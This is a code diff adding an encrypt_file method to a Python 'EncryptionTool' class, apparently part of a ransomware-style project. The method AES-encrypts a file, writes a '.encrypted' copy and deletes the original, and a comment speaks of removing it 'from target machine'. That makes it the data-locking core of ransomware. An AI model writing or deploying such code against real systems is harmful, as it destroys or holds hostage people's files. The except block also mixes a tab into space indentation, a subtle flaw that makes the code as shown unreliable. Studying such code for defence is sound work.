@@ -197,6 +197,35 @@ class EncryptionTool:
             logging.error(f"Failed to create important files: {str(e)}")
 
 
+    # Create Function to Encrypt a Single File
+    def encrypt_file(self, file_path):
+        try:
+            # Generate a 16-byte IV
+            iv = get_random_bytes(16)
+
+            # Create a Cipher object with key+iv on CBC Mode
+            cipher = AES.new(self.key, AES.MODE_CBC, iv)
+
+            # Open file_path in Read Binary Mode and then read file contents
+            with open(file_path, 'rb') as file:
+                fileData = file.read()
+
+            # Encrypt fileData using the Cipher object with AES Algorithm
+            encryptedData =cipher.encrypt(pad(fileData, AES.block_size))
+
+            # Write the encryptedData + iv to a new file with .encrypted Extension
+            with open(file_path + ".encrypted", 'wb') as file:
+                file.write(iv + encryptedData)
+
+            # Remove the Original file from target machine
+            os.remove(file_path)
+
+            # Submit an Info Log from encryption to Log Console
+            logging.info(f"[+] Encrypting {file_path} ...")
+        except Exception as e:
+            #Submit an Error Log from encryption to Log Console
+			logging.error(f"[-] Failed to encrypt {file_path}: Error: {str(e)}")
+
 
 
 
